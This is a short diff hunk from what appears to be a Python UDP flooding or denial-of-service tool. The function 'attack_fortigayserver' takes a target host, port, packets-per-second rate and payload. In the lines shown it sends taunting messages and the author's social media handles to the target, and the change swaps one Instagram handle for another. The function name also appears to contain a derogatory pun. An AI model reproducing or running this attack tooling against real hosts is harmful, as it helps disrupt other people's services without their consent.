@@ -1691,7 +1691,7 @@ def attack_fortigayserver(host, port, timer, pps, payload):
         s.sendto(b"Hello Friend", (str(host), int(port)))
         s.sendto(b"Hello Friend", (str(host), int(port)))
         s.sendto(b"Thank u for use it", (str(host), int(port)))
-        s.sendto(b"MY Insta : https://instagram.com/is.not_walid", (str(host), int(port)))
+        s.sendto(b"MY Insta : https://instagram.com/h04x_h04x", (str(host), int(port)))
         s.sendto(b"My github page : https://github.com/black-hat-rgb", (str(host), int(port)))
         s.sendto(b"By Friend", (str(host), int(port)))
 
